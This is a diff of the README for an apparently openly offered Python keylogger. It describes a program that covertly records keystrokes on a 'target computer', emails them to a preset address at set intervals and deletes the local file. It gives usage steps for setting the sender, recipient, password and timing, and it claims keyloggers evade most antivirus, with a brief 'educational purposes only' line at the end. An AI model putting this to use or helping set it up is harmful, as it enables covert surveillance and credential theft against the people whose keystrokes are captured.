@@ -1,7 +1,16 @@
 # Keylogger
-This programme can record keystrokes typed on target computer's keyboard and sends periodic emails with the file as attachment.
-It stores the keystrokes in a text file in temporary folder and then deletes the file after sending the email.
-This programme only works when there is active internet connection.
-To use, install python3 and pynput library. Change 'from address' and 'to address' for sending email from lines 27 and 28.
-Add password of email-id on line 50.
-To change time after which emails are sent, change the args on line 84.
+A keylogger is a malicious piece of software that records keystrokes on a computer and sends them to other parties via the internet. A major disadvantage of keyloggers over other malware (in terms of security) is that they go undetected by most anti-virus softwares.
+
+This keylogger records keystrokes for a specified amount of time in a temporary file (.tmp) and sends them to a predefined email as an attachment. After that, it deletes the file from the target machine and creates a new file, repeating the process till the program is stopped.
+
+# Requirements
+An active internet connection for both the sending and receiving computers.
+Python 3
+Pynput library
+
+# Usage
+Change the value of from_add and to_add on line 29 and 30.
+Add password of from_add on line 52.
+Change the amount of listening time on line 80. It is currently set to 10 seconds.
+
+Lastly, I hope this piece of software is used for educational purposes only.
